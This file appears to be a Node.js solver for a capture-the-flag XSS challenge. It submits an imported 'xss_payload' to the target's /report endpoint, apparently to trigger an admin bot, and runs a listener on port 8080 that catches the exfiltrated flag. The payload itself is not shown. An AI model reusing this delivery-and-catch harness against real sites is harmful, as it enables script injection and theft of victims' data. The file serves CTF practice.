const fastify = require("fastify")();
const { xss_payload } = require("./exploit.js");

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const WEB_BASE_URL = process.env.WEB_BASE_URL ?? fail("No WEB_BASE_URL");
const PORT = "8080";

const sleep = (msecs) => new Promise((resolve) => setTimeout(resolve, msecs));

const reportExpr = async (expr) => {
  const params = new URLSearchParams();
  params.append('expr', expr);

  const text = await fetch(`${WEB_BASE_URL}/report`, {
    method: "POST",
    body: params,
  }).then(r => r.text());

  console.log(text)

  return text;
}

const start = async () => {
  fastify.post("/", async (req, reply) => {
    // You got a flag!
    console.log(req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    // await sleep(5 * 1000);
    await reportExpr(xss_payload);

    fail("Failed");
  });
};


start();
